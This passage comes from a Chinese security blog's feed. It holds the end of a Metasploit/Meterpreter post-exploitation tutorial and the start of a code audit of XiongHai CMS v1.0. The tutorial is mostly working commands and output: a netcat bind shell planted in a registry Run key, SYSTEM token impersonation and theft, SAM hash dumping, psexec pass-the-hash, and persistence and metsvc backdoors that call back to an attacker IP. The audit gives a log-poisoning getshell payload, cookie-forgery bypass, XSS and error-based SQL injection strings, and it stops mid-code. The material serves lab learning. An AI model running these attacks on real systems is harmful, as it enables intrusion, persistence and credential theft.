class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32</span><br><span class="line">[*] uploading  : /usr/share/windows-binaries/nc.exe -&gt; C:\windows\system32</span><br><span class="line">[*] uploaded   : /usr/share/windows-binaries/nc.exe -&gt; C:\windows\system32\nc.exe</span><br><span class="line">meterpreter &gt; reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run</span><br><span class="line">Enumerating: HKLM\software\microsoft\windows\currentversion\run</span><br><span class="line"></span><br><span class="line">  Values (1):</span><br><span class="line"></span><br><span class="line">VMware User Process</span><br><span class="line"></span><br><span class="line">meterpreter &gt; reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v lltest_nc -d &apos;C:\windows\system32\nc.exe -Ldp 443 -e cmd.exe&apos;</span><br><span class="line">Successfully set lltest_nc of REG_SZ.</span><br><span class="line">meterpreter &gt; reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v lltest_nc</span><br><span class="line">Key: HKLM\software\microsoft\windows\currentversion\Run</span><br><span class="line">Name: lltest_nc</span><br><span class="line">Type: REG_SZ</span><br><span class="line">Data: C:\windows\system32\nc.exe -Ldp 443 -e cmd.exe</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nc 192.168.22.171 443</span><br><span class="line">Microsoft Windows [�汾 6.1.7600]</span><br><span class="line">��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ����</span><br><span class="line"></span><br><span class="line">C:\Windows\SysWOW64&gt;whoami</span><br><span class="line">whoami</span><br><span class="line">win-7\win7</span><br><span class="line"></span><br><span class="line">C:\Windows\SysWOW64&gt;</span><br></pre></td></tr></table></figure><h2><span id="令牌操纵">令牌操纵</span></h2><h3><span id="incognito假冒令牌">incognito假冒令牌</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use incognito      #help incognito  查看帮助</span><br><span class="line">list_tokens -u    #查看可用的token</span><br><span class="line">impersonate_token &apos;NT AUTHORITY\SYSTEM&apos;  #假冒SYSTEM token</span><br><span class="line">或者impersonate_token NT\ AUTHORITY\\SYSTEM #不加单引号 需使用\\</span><br><span class="line">execute -f cmd.exe -i –t    # -t 使用假冒的token 执行</span><br><span class="line">或者直接shell</span><br><span class="line">rev2self   #返回原始token</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: WIN-7\Administrator</span><br><span class="line">meterpreter &gt; list_tokens -u</span><br><span class="line">[-] Warning: Not currently running as SYSTEM, not all tokens will be available</span><br><span class="line">             Call rev2self if primary process token is SYSTEM</span><br><span class="line"></span><br><span class="line">Delegation Tokens Available</span><br><span class="line">========================================</span><br><span class="line">NT AUTHORITY\SYSTEM</span><br><span class="line">WIN-7\Administrator</span><br><span class="line"></span><br><span class="line">Impersonation Tokens Available</span><br><span class="line">========================================</span><br><span class="line">No tokens available</span><br><span class="line"></span><br><span class="line">meterpreter &gt; impersonate_token &apos;NT AUTHORITY\SYSTEM&apos;</span><br><span class="line">[-] Warning: Not currently running as SYSTEM, not all tokens will be available</span><br><span class="line">             Call rev2self if primary process token is SYSTEM</span><br><span class="line">[+] Delegation token available</span><br><span class="line">[+] Successfully impersonated user NT AUTHORITY\SYSTEM</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br><span class="line"></span><br><span class="line">meterpreter &gt; rev2self </span><br><span class="line">meterpreter &gt; getuid </span><br><span class="line">Server username: WIN-7\Administrator</span><br></pre></td></tr></table></figure><h3><span id="steal_token窃取令牌">steal_token窃取令牌</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">steal_token &lt;pid值&gt;   #从指定进程中窃取token   先ps</span><br><span class="line">drop_token  #删除窃取的token</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getuid </span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br><span class="line">meterpreter &gt; steal_token 3416</span><br><span class="line">Stolen token with username: WIN-7\Administrator</span><br><span class="line">meterpreter &gt; getuid </span><br><span class="line">Server username: WIN-7\Administrator</span><br><span class="line">meterpreter &gt; drop_token </span><br><span class="line">Relinquished token, now running as: WIN-7\Administrator</span><br></pre></td></tr></table></figure><h2><span id="哈希利用">哈希利用</span></h2><h3><span id="获取哈希">获取哈希</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/smart_hashdump  #从SAM导出密码哈希</span><br><span class="line">#需要SYSTEM权限</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/smart_hashdump</span><br><span class="line"></span><br><span class="line">[*] Running module against WIN-7</span><br><span class="line">[*] Hashes will be saved to the database if one is connected.</span><br><span class="line">[+] Hashes will be saved in loot in JtR password file format to:</span><br><span class="line">[*] /root/.msf4/loot/20181219014335_default_192.168.22.171_windows.hashes_427821.txt</span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line">[*] Running as SYSTEM extracting hashes from registry</span><br><span class="line">[*] Obtaining the boot key...</span><br><span class="line">[*] Calculating the hboot key using SYSKEY 3a0c900d7f8d17e229f42745cc605dfe...</span><br><span class="line">[*] Obtaining the user list and keys...</span><br><span class="line">[*] Decrypting user keys...</span><br><span class="line">[*] Dumping password hints...</span><br><span class="line">[*] No users with password hints on this system</span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line">[+] Administrator:500:aad3b435b51404eeaad3b435b51404ee:45a524862326cb9e7d85af4017a000f0:::</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure><h3><span id="psexec哈希传递">PSExec哈希传递</span></h3><p>通过<code>smart_hashdump</code>获取用户哈希后，可以利用<code>psexec</code>模块进行哈希传递攻击<br>前提条件：</p><ol><li>开启445端口 smb服务</li><li>开启admin$共享</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/windows/smb/psexec</span><br><span class="line">msf &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf &gt; set LHOST 192.168.159.134</span><br><span class="line">msf &gt; set LPORT 443</span><br><span class="line">msf &gt; set RHOST 192.168.159.144</span><br><span class="line">msf &gt;set SMBUser Administrator</span><br><span class="line">msf &gt;set SMBPass aad3b4*****04ee:5b5f00*****c424c</span><br><span class="line">msf &gt;set SMBDomain  WORKGROUP   #域用户需要设置SMBDomain</span><br><span class="line">msf &gt;exploit</span><br></pre></td></tr></table></figure><h2><span id="后门植入">后门植入</span></h2><p><code>metasploit</code>自带的后门有两种方式启动的，一种是通过启动项启动(<code>persistence</code>)，一种是通过服务启动(<code>metsvc</code>)，另外还可以通过<code>persistence_exe</code>自定义后门文件。</p><h3><span id="persistence启动项后门">persistence启动项后门</span></h3><p>在<code>C:\Users***\AppData\Local\Temp\</code>目录下，上传一个vbs脚本<br>在注册表<code>HKLM\Software\Microsoft\Windows\CurrentVersion\Run\</code>加入开机启动项</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run persistence –h  #查看帮助</span><br><span class="line">run persistence -X -i 5 -p 6661 -r 192.168.159.134</span><br><span class="line">#-X指定启动的方式为开机自启动，-i反向连接的时间间隔(5s) –r 指定攻击者的ip</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run persistence -X -i 5 -p 6661 -r 192.168.22.170</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.</span><br><span class="line">[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]</span><br><span class="line">[*] Running Persistence Script</span><br><span class="line">[*] Resource file for cleanup created at /root/.msf4/logs/persistence/WIN-7_20181219.5619/WIN-7_20181219.5619.rc</span><br><span class="line">[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=192.168.22.170 LPORT=6661</span><br><span class="line">[*] Persistent agent script is 99632 bytes long</span><br><span class="line">[+] Persistent Script written to C:\Users\ADMINI~1\AppData\Local\Temp\uIMYmofzh.vbs</span><br><span class="line">[*] Executing script C:\Users\ADMINI~1\AppData\Local\Temp\uIMYmofzh.vbs</span><br><span class="line">[+] Agent executed with PID 336</span><br><span class="line">[*] Installing into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\QXbddoBLcqYjXg</span><br><span class="line">[+] Installed into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\QXbddoBLcqYjXg</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler </span><br><span class="line">msf exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(multi/handler) &gt; set lhost 192.168.22.170</span><br><span class="line">lhost =&gt; 192.168.22.170</span><br><span class="line">msf exploit(multi/handler) &gt; set lport 6661</span><br><span class="line">lport =&gt; 6661</span><br><span class="line">msf exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.22.170:6661 </span><br><span class="line">[*] Sending stage (179779 bytes) to 192.168.22.171</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.22.170:6661 -&gt; 192.168.22.171:49327) at 2018-12-19 01:57:52 -0500</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure><h3><span id="metsvc服务后门">metsvc服务后门</span></h3><p>在<code>C:\Users***\AppData\Local\Temp\</code>上传了三个文件（<code>metsrv.x86.dll</code>、<code>metsvc-server.exe</code>、<code>metsvc.exe</code>），通过服务启动，服务名为meterpreter</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run metsvc –h   # 查看帮助</span><br><span class="line">run metsvc –A   #自动安装后门</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run metsvc -A</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.</span><br><span class="line">[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]</span><br><span class="line">[*] Creating a meterpreter service on port 31337</span><br><span class="line">[*] Creating a temporary installation directory C:\Users\ADMINI~1\AppData\Local\Temp\QVRUVXrjfrcMn...</span><br><span class="line">[*]  &gt;&gt; Uploading metsrv.x86.dll...</span><br><span class="line">[*]  &gt;&gt; Uploading metsvc-server.exe...</span><br><span class="line">[*]  &gt;&gt; Uploading metsvc.exe...</span><br><span class="line">[*] Starting the service...</span><br><span class="line"> * Installing service metsvc</span><br><span class="line">Cannot create service (0x00000431)</span><br><span class="line"></span><br><span class="line">[*] Trying to connect to the Meterpreter service at 192.168.22.171:31337...</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure><h2><span id="扫描脚本">扫描脚本</span></h2><p>扫描的脚本位于：<br><code>/usr/share/metasploit-framework/modules/auxiliary/scanner/</code><br>扫描的脚本较多，仅列几个代表：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/http/dir_scanner</span><br><span class="line">use auxiliary/scanner/http/jboss_vulnscan</span><br><span class="line">use auxiliary/scanner/mssql/mssql_login</span><br><span class="line">use auxiliary/scanner/mysql/mysql_version</span><br><span class="line">use auxiliary/scanner/oracle/oracle_login</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- ttoc --&gt;
&lt;h2&gt;&lt;span id=&quot;系统命令&quot;&gt;系统命令&lt;/span&gt;&lt;/h2&gt;&lt;h3&gt;&lt;span id=&quot;基本系统命令&quot;&gt;基本系统命令&lt;/span&gt;&lt;/h3&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td cla
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>代码审计3-熊海cms v1.0</title>
    <link href="https://uknowsec.cn/posts/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A13-%E7%86%8A%E6%B5%B7cms-v1-0.html"/>
    <id>https://uknowsec.cn/posts/代码审计/代码审计3-熊海cms-v1-0.html</id>
    <published>2018-09-06T12:13:47.000Z</published>
    <updated>2019-01-07T08:24:19.766Z</updated>
    
    <content type="html"><![CDATA[<!-- ttoc --><h3><span id="前言">前言</span></h3><p>菜狗子学代码审计，只能挑挑软柿子捏一捏了。MVC框架现在估计是审计不出来，只能找找代码流不仅小一点，小型的CMS下手了。所以找了这一套又老有小的CMS来练练手了，目前还是用<code>seay审计系统</code>先扫描可疑的漏洞点，然后一个一个地去看漏洞涉及的代码，可能菜是原罪吧。</p><h3><span id="熊海cms-v10">熊海CMS v1.0</span></h3><h4><span id="任意文件包含">任意文件包含</span></h4><p>在路径<code>/admin/index.php</code>中，有一段入口文件代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//单一入口模式</span><br><span class="line">error_reporting(0); //关闭错误显示</span><br><span class="line">$file=addslashes($_GET[&apos;r&apos;]); //接收文件名</span><br><span class="line">$action=$file==&apos;&apos;?&apos;index&apos;:$file; //判断为空或者等于index</span><br><span class="line">include(&apos;files/&apos;.$action.&apos;.php&apos;); //载入相应文件</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这里的变量<code>$_GET[&#39;r&#39;]</code>仅仅用<code>addslashes()</code>函数进行简单的转义，直接进行文件包含，但是在<code>include()</code>函数里拼接了<code>.php</code>后缀。所以必须要上传了<code>.php</code>文件才行。</p><p>手动在文件目录下创建<code>1.php</code>,用<code>r=../1</code>包含该文件，但是这个貌似有点鸡肋。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/xhcms_1.jpg" alt=""></p><p>如果满足如下条件，就可以利用<code>%00</code>截断可以进行包含文件进行getshell</p><ul><li>PHP版本 &lt; 5.3</li><li>magic_quotes_gpc = off</li><li>没有用addslashes()进行转义处理</li></ul><p>手动把<code>PHP</code>版本调到<code>5.2.17</code>，并且把<code>magic_quotes_gpc = off</code>,去掉原来代码中的<code>addslashes()</code>函数处理进行文件包含<code>getshell</code>。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/xhcms_16.jpg" alt=""></p><p>另外再修改代码测试一下，把拼接部分的<code>php</code>后缀去掉。然后就可以利用到包含日志文件进行<code>getshell</code>了。</p><p><code>Payload:r=../../../Apache/logs/access.log &lt;?php phpinfo(); ?&gt;</code></p><p>浏览器会对一些字符进行转义编码，用burp直接发包。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /index.php?r=../../../Apache/logs/access.log &lt;?php phpinfo(); ?&gt; HTTP/1.1</span><br><span class="line">Host: xhcms.com</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/xhcms_3.jpg" alt=""></p><h4><span id="cookie伪造越权访问">cookie伪造越权访问</span></h4><p>在路径<code>\inc\checklogin.php</code>的代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$user=$_COOKIE[&apos;user&apos;];</span><br><span class="line">if ($user==&quot;&quot;)&#123;</span><br><span class="line">header(&quot;Location: ?r=login&quot;);</span><br><span class="line">exit;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><code>checklogin.php</code>文件用来检查用户的<code>COOKIE</code>,判断仅仅是判断<code>COOKIE</code>是否不为空，所以只要我们伪造任意不为空的<code>COOKIE</code>值就可以跳过后面的重定向了。</p><p>在<code>\admin\files</code>目录下的所有的文件都是通过<code>require()</code>函数来包含这个文件进行COOKIE认证的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">require &apos;../inc/checklogin.php&apos;;</span><br></pre></td></tr></table></figure><p>所以我们可以直接伪造任意不为空的<code>COOKIE</code>值来进行越权访问。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/xhcms_4.jpg" alt=""></p><h4><span id="存储型xss">存储型XSS</span></h4><p>在每个文章下面是可以进行评论的，提交了一下评论表单，用<code>PHPStorm</code>调试跟进。发现评论内容是被过滤了的。</p><p>在文件<code>\files\submit.php</code>中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$content= addslashes(strip_tags($content));//过滤HTML</span><br></pre></td></tr></table></figure><p>但是没有过滤其他的字段，这里仍然可以利用其他字段进行XSS攻击。</p><p>利用昵称进行XSS测试。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/xhcms_5.jpg" alt=""></p><p>这里好像把页面的html也插坏了。。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/xhcms_6.jpg" alt=""></p><p>后台管理员界面：</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/xhcms_7.jpg" alt=""></p><h4><span id="反射型xss">反射型XSS</span></h4><p>在路径<code>\files\contact.php</code>中，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$page=addslashes($_GET[&apos;page&apos;]);</span><br><span class="line">if ($page&lt;&gt;&quot;&quot;)&#123;</span><br><span class="line">if ($page&lt;&gt;1)&#123;</span><br><span class="line">$pages=&quot;第&quot;.$page.&quot;页 - &quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这里的<code>$page</code>是直接仅仅进行了转义，然后直接代入以下的<code>html</code>代码里。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a&gt;第 &lt;?php echo $page?&gt; - &lt;?php echo $Totalpage?&gt; 页 共 &lt;?php echo $Total?&gt; 条&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>所以可以XSS。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/xhcms_8.jpg" alt=""></p><h4><span id="前台多处报错注入">前台多处报错注入</span></h4><h5><span id="filessoftwarephp报错注入">\files\software.php报错注入</span></h5><p>在路径<code>\files\software.php</code>如下代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$query = &quot;SELECT * FROM settings&quot;;</span><br><span class="line">$resul = mysql_query($query) or die(&apos;SQL语句有误：&apos;.mysql_error());</span><br><span class="line">$info = mysql_fetch_array($resul);</span><br><span class="line">$id=addslashes($_GET[&apos;cid&apos;]);</span><br><span class="line">$query = &quot;SELECT * FROM download WHERE id=&apos;$id&apos;&quot;;</span><br><span class="line">$resul = mysql_query($query) or die(&apos;SQL语句有误：&apos;.mysql_error());</span><br><span class="line">$download = mysql_fetch_array($resul);</span><br><span class="line"></span><br><span class="line">//浏览计数</span><br><span class="line">$query = &quot;UPDATE download SET hit = hit+1 WHERE id=$id&quot;;</span><br><span class="line">@mysql_query($query) or die(&apos;修改错误：&apos;.mysql_error());</span><br></pre></td></tr></table></figure><p>这里的<code>cid</code>变量通过<code>GET</code>请求提交，然后通过一个<code>addslashes()</code>函数进行简单的转义，这样对注入是没有防护作用的。所以可以直接进行注入，这里是通过<code>die(&#39;SQL语句有误：&#39;.mysql_error());</code>输出报错信息，所以是属于报错注入。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/xhcms_10.jpg" alt=""></p><h5><span id="filescontentphp报错注入">\files\content.php报错注入</span></h5><p>在路径<code>\files\content.php</code>代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$query = &quot;SELECT * FROM settings&quot;;</span><br><span class="line">$resul = mysql_query($query) or die(&apos;SQL语句有误：&apos;.mysql_error());</span><br><span class="line">$info = mysql_fetch_array($resul);</span><br><span class="line"></span><br><span class="line">$id=addslashes($_GET[&apos;cid&apos;]);</span><br><span class="line">$query = &quot;SELECT * FROM content WHERE id=&apos;$id&apos;&quot;;</span><br><span class="line">$resul = mysql_query($query) or die(&apos;SQL语句有误：&apos;.mysql_error());</span><br><span class="line">$content = mysql_fetch_array($resul);</span><br><span class="line"></span><br><span class="line">$navid=$content[&apos;navclass&apos;];</span><br><span class="line">$query = &quot;SELECT * FROM navclass WHERE id=&apos;$navid&apos;&quot;;</span><br><span class="line">$resul = mysql_query($query) or die(&apos;SQL语句有误：&apos;.mysql_error());</span><br><span class="line">$navs = mysql_fetch_array($resul);</span><br></pre></td></tr></table></figure><p>这里的<code>cid</code>变量跟<code>\files\software.php</code>是一样的。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/xhcms_11.jpg" alt=""></p><h5><span id="filessubmitphp报错注入">\files\submit.php报错注入</span></h5><p>在<code>\files\submit.php</code>路径下，有几处SQL注入，有跟前面一样的<code>cid</code>变量，另外还有下面的<code>mail</code>变量。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$query = &quot;SELECT * FROM interaction WHERE( mail = &apos;$mail&apos;)&quot;;</span><br><span class="line">$result = mysql_query($query) or die(&apos;SQL语句有误：&apos;.mysql_error());</span><br><span class="line">$tx = mysql_fetch_array($result);</span><br><span class="line">if (!mysql_num_rows($result))&#123;  </span><br><span class="line">$touxiang = mt_rand(1,100);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">$touxiang = $tx[&apos;touxiang&apos;];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的<code>mail</code>变量是POST提交的，没有经过任何过滤，闭合单引号和括号。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;) and (updatexml(1,concat(0x7e,(select user()),0x7e),1))#</span><br></pre></td></tr></table></figure><p>在评论处，添加评论并在邮箱处插入payload。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/xhcms_12.jpg" alt=""></p><p>提交返回报错信息。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/xhcms_13.jpg" alt=""></p><h4><span id="后台报错注入">后台报错注入</span></h4><h5><span id="adminfileswzlistphp报错注入">\admin\files\wzlist.php报错注入</span></h5><p>后台也有不少可以进行报错注入的点，这里有一处是利用到<code>delete</code>语句的。。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$delete=$_GET[&apos;delete&apos;];</span><br><span class="line">if ($delete&lt;&gt;&quot;&quot;)&#123;</span><br><span class="line">$query = &quot;DELETE FROM content WHERE id=&apos;$delete&apos;&quot;;</span><br><span class="line">$result = mysql_query($query) or die(&apos;SQL语句有误：&apos;.mysql_error());</span><br><span class="line">echo &quot;&lt;script&gt;alert(&apos;亲，ID为&quot;.$delete.&quot;的内容已经成功删除！&apos;);location.href=&apos;?r=wzlist&apos;&lt;/script&gt;&quot;;</span><br><span class="line">exit; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接闭合单引号就可以了，这里也没对单引号进行转义的。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/xhcms_17.jpg" alt="">后台的注入在这cms里来看并不是很鸡肋，因为我们结合前面得到的<code>cookie伪造越权访问</code>在没有管理员账号密码的情况下进行注入。例如：</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/xhcms_18.jpg" alt=""></p><h5><span id="adminfilesnewlinkphp报错注入">\admin\files\newlink.php报错注入</span></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 